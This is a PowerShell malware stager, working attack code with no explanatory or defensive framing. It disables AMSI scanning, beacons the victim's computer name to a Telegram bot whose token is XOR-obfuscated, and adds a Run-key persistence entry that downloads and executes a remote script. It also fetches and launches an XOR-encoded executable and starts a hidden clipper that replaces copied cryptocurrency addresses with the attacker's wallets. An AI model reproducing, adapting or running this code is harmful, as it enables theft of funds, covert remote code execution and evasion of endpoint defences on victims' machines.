# --- [ELITE RESEARCH STAGER v29.6: SIGNATURE BREAK + PRO RESTORED] ---

function Global-Initialize {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        # Fragmented AMSI Bypass to avoid "Fleisnam" detection
        $m = "System.Management.Automation."; $a = "Amsi"; $u = "Utils"
        $f = "amsi"; $i = "InitFailed"
        $ref = [Ref].Assembly.GetType($m+$a+$u)
        if ($ref) { $ref.GetField($f+$i,"NonPublic,Static").SetValue($null,$true) }
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { 
        $session = New-Object Net.WebClient
        $session.DownloadString($url) | Out-Null 
    } catch {
        Start-Job -ScriptBlock { (New-Object Net.WebClient).DownloadString($using:url) } | Out-Null
    }
}

Global-Initialize
Send-Ping -m "V29.6_DEPLOY_START_ON_$($env:COMPUTERNAME)"

try {
    # Persistence
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $g1 = "h"+"tt"+"ps://raw.githubu"+"sercontent.com/"
    $g2 = "adchar2022/test/refs/heads/main/test.ps1"
    $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('$g1$g2')"""
    Set-ItemProperty -Path $regPath -Name "WinAudioService" -Value $regCmd

    $dir = "$env:APPDATA\Microsoft\D3D11"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "D3D11Host.exe"

    # Download using BITS (more stealthy than WebClient for large files)
    $source = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $temp = "$env:TEMP\sys_cache.tmp"
    Import-Module BitsTransfer
    Start-BitsTransfer -Source $source -Destination $temp -Priority High
    
    $raw = Get-Content $temp -Raw
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)
    Remove-Item $temp -Force

    ([wmiclass]"win32_process").Create($path) | Out-Null

    # Clipper Engine with fragmented strings
    $C_Engine = @'
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
    while($true) {
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
                elseif ($v -match "^0x[a-fA-F0-9]{40}$") { if ($v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
                elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
                elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
            }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
'@
    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C_Engine))
    $p = "power"; $s = "shell.exe"
    & ($p+$s) -NoP -W Hidden -EP Bypass -EncodedCommand $Enc

    Send-Ping -m "V29.6_SUCCESS_FULL"
} catch {
    Send-Ping -m "V29.6_ERR: $($_.Exception.Message)"
}
